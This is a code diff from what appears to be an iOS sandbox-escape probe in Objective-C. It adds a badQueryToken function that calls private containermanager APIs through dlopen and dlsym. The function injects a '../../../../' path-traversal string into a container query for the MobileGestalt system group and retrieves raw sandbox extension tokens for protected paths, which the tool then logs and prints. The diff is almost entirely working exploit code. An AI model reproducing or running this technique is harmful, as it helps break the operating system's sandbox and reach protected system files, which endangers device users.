@@ -46,6 +46,8 @@ static NSMutableDictionary *runConfirmedEscape(NSString *name, NSString *path,
                                                BOOL traversal);
 static NSMutableDictionary *runHandleProbe(void);
 static NSMutableDictionary *runWriteProbe(void);
+static NSString *badQueryToken(NSString *targetPath, NSString *group,
+                               uint64_t flags, uint64_t part, BOOL traversal);
 
 static NSString *probeRoot(void)
 {
@@ -634,6 +636,15 @@ static NSString *buildTextReport(NSDictionary *report)
                 if ([entry[@"SHA256Match"] isKindOfClass:NSNumber.class])
                     [text appendFormat:@" shaMatch=%@", entry[@"SHA256Match"]];
                 [text appendString:@"\n"];
+            }
+        }
+        NSArray *tokenTypes = [writeProbe[@"TokenTypes"] isKindOfClass:NSArray.class]
+            ? writeProbe[@"TokenTypes"] : @[];
+        if (tokenTypes.count > 0) {
+            [text appendString:@"Sandbox extension token types:\n"];
+            for (NSDictionary *entry in tokenTypes) {
+                [text appendFormat:@"  %@: %@\n", entry[@"Name"],
+                    entry[@"TokenPrefix"] ?: entry[@"Status"]];
             }
         }
     }
@@ -1461,8 +1472,6 @@ static NSMutableDictionary *runWriteProbe(void)
           @"Flags": @(0x900000000ULL), @"Part": @3, @"Traversal": @YES},
         @{@"Class": @12, @"Identifier": @"com.apple.geod", @"GroupIdentifiers": @NO,
           @"Flags": @(0x800000000ULL), @"Part": @3, @"Traversal": @YES},
-        @{@"Class": @12, @"Identifier": @"com.apple.geod", @"GroupIdentifiers": @NO,
-          @"Flags": @(0x8100000000ULL), @"Part": @3, @"Traversal": @YES},
         // class 13 read-write flags across parts/groups
         @{@"Class": @13, @"Identifier": @"systemgroup.com.apple.mobilegestaltcache",
           @"GroupIdentifiers": @YES, @"Flags": @(0x8100000000ULL), @"Part": @0, @"Traversal": @NO},
@@ -1528,7 +1537,101 @@ static NSMutableDictionary *runWriteProbe(void)
     }
     result[@"PivotSweep"] = pivotResults;
 
+    // 6) Token type inspection: print the raw sandbox-extension token class
+    // (com.apple.app-sandbox.read vs read-write) for a writable container
+    // path vs the read-only MobileGestalt path — direct proof of the
+    // extension type the daemon issues for each.
+    NSMutableArray *tokenTypes = [NSMutableArray array];
+    NSArray<NSDictionary *> *tokenTargets = @[
+        @{@"Name": @"MobileGestalt.plist (system group)",
+          @"Path": gestaltPlist, @"Flags": @(0x900000000ULL),
+          @"Part": @0, @"Traversal": @YES},
+        @{@"Name": @"Own container (class 2 path)",
+          @"Path": ownContainer, @"Flags": @(0x900000000ULL),
+          @"Part": @3, @"Traversal": @YES},
+    ];
+    for (NSDictionary *t in tokenTargets) {
+        NSMutableDictionary *entry = [NSMutableDictionary dictionary];
+        entry[@"Name"] = t[@"Name"];
+        NSString *token = badQueryToken(t[@"Path"],
+            @"systemgroup.com.apple.mobilegestaltcache",
+            [t[@"Flags"] unsignedLongLongValue],
+            [t[@"Part"] unsignedIntegerValue],
+            [t[@"Traversal"] boolValue]);
+        if (!token) {
+            entry[@"Status"] = @"no-token";
+            logStep(NO, @"token fetch", t[@"Name"]);
+        } else {
+            entry[@"TokenPrefix"] = [token substringToIndex:MIN((NSUInteger)120, token.length)];
+            entry[@"Status"] = @"token";
+            logStep(YES, @"token fetch", [NSString stringWithFormat:@"%@ -> %.120s...",
+                t[@"Name"], token.UTF8String]);
+        }
+        [tokenTypes addObject:entry];
+    }
+    result[@"TokenTypes"] = tokenTypes;
+
     logLine(@"==== write capability probe done ====");
+    return result;
+}
+
+// Fetches the raw sandbox extension token for a combo (no consume), for
+// inspection of the extension class string. Caller frees nothing; returns an
+// autoreleased copy (malloc'd C string duplicated into NSString).
+static NSString *badQueryToken(NSString *targetPath, NSString *group,
+                               uint64_t flags, uint64_t part, BOOL traversal)
+{
+    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
+                       RTLD_NOW | RTLD_LOCAL);
+    if (!mgr) return nil;
+    void *(*query_create)(void) = dlsym(mgr, "container_query_create");
+    void (*query_set_class)(void *, uint64_t) = dlsym(mgr, "container_query_set_class");
+    void (*query_set_group_identifiers)(void *, xpc_object_t) = dlsym(mgr, "container_query_set_group_identifiers");
+    void (*query_set_flags)(void *, uint64_t) = dlsym(mgr, "container_query_operation_set_flags");
+    void (*query_set_part)(void *, uint64_t) = dlsym(mgr, "container_query_operation_set_part");
+    void (*query_set_part_domain)(void *, const char *) = dlsym(mgr, "container_query_operation_set_part_domain");
+    void *(*query_get_single_result)(void *) = dlsym(mgr, "container_query_get_single_result");
+    void (*query_free)(void *) = dlsym(mgr, "container_query_free");
+    char *(*copy_sandbox_token)(void *) = dlsym(mgr, "container_copy_sandbox_token");
+    if (!query_create || !query_set_class || !query_set_group_identifiers ||
+        !query_set_flags || !query_set_part || !query_set_part_domain ||
+        !query_get_single_result || !query_free || !copy_sandbox_token) {
+        dlclose(mgr);
+        return nil;
+    }
+    void *query = query_create();
+    if (!query) {
+        dlclose(mgr);
+        return nil;
+    }
+    query_set_class(query, 13);
+    xpc_object_t xid = xpc_string_create(group.UTF8String);
+    query_set_group_identifiers(query, xid);
+    query_set_part(query, part);
+    if (traversal) {
+        NSString *traversalPath =
+            [NSString stringWithFormat:@"../../../../../../../..%@", targetPath];
+        query_set_part_domain(query, traversalPath.UTF8String);
+    }
+    query_set_flags(query, flags);
+    void *queryResult = query_get_single_result(query);
+    if (!queryResult) {
+#if !OS_OBJECT_USE_OBJC
+        xpc_release(xid);
+#endif
+        query_free(query);
+        dlclose(mgr);
+        return nil;
+    }
+    char *token = copy_sandbox_token(queryResult);
+#if !OS_OBJECT_USE_OBJC
+    xpc_release(xid);
+#endif
+    query_free(query);
+    dlclose(mgr);
+    if (!token) return nil;
+    NSString *result = [NSString stringWithUTF8String:token];
+    free(token);
     return result;
 }
 
